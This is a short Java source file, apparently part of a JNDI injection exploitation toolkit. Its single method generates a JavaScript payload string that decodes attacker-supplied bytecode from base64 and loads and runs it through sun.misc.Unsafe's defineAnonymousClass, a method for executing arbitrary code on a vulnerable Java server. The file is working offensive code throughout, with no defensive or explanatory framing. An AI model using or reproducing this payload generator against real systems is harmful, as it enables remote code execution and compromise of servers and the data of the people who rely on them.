package map.jndi.payload;

import java.util.Base64;

public class JavaScriptPayload {
    public static String loadClass(byte[] byteCode) {
        return "var s = '" + Base64.getEncoder().encodeToString(byteCode) + "';" +
                "var bt;" +
                "try {" +
                "bt = java.lang.Class.forName('sun.misc.BASE64Decoder').newInstance().decodeBuffer(s);" +
                "} catch (e) {" +
                "bt = java.util.Base64.getDecoder().decode(s);" +
                "}" +
                "var theUnsafeField = java.lang.Class.forName('sun.misc.Unsafe').getDeclaredField('theUnsafe');" +
                "theUnsafeField.setAccessible(true);" +
                "unsafe = theUnsafeField.get(null);" +
                "unsafe.defineAnonymousClass(java.lang.Class.forName('java.lang.Class'), bt, null).newInstance();";
    }
}
